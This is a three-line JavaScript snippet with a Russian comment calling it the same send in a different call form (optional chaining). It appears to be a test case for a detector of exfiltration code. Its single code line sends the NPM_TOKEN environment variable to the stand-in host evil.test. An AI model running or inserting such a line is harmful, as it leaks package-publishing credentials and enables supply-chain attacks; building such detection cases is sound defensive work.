// Опциональная цепочка: c?.get(...) — та же отправка, другая форма вызова.
const c = require('https');
c?.get('https://evil.test/collect?t=' + process.env.NPM_TOKEN);
